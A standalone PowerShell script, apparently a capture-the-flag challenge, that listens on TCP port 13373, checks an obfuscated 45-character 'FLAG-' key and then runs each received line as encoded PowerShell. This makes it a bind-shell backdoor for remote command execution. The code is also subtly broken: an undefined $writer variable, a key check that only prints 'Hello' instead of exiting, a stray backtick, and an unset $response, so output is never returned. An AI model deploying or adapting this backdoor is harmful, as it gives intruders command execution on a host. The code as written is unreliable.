$endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, 13373)
$listener = New-Object System.Net.Sockets.TcpListener($endpoint)
$listener.start()

$conn = $listener.AcceptTcpClient()
$stream = $conn.GetStream()

$read = New-Object System.IO.StreamReader($stream)
$write = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

if ($stream.DataAvailable) {
    $key = $read.ReadLine()
}

if ($key.Length -ne 45) {
    Exit
}

$p1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($key.Substring(0,5)))


$p2 = $key.Substring(5, 16)
$p2 = [System.Text.Encoding]::UTF8.GetBytes($p2[-1..-($p2.Length)] -join "")
$p2 = [System.Convert]::ToBase64String($p2)


$p4 = [int64]([System.Text.Encoding]::UTF7.GetBytes($key.Substring(29, 8)) -join "")
$p5 = [int]::Parse($key.Substring(37, 8), [System.Globalization.NumberStyles]::HexNumber)
if ($p1 -ne "RkxBRy0=" -or $p2 -ne "YTEwM2Y3ZDg2MDViYzU5Yw==" -or -not
    ($key -match "^.{4}-[a-f0-9]{40}$" -and $key -cmatch "^.{21}\d[0-6a-z][2abcd][^A-Za-z0-24-6]{5}" -and $key -cmatch "^.{21}[57-9][-;a%$][^\D](8)(9)(3)\2[^\1\2\3]") -or
    ($p4 -ne 0x11680e4e4c5f2d) -or ($p5 -ne 2130468858)) {
    Write-Output "Hello"
}



while ($true) {
    if ($stream.DataAvailable) {
        $command = $read.ReadLine()`
    }
    if ([String]::IsNullOrEmpty($command)) {
        Exit
    }
    try {
        $commandb64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
        $result = &powershell.exe -encodedcommand "$commandb64" 2>&1 | Out-String
    } catch {
        $result = "Error: $error[0]"
    }
    if ($response) {
        $write.Write($result)
    }
}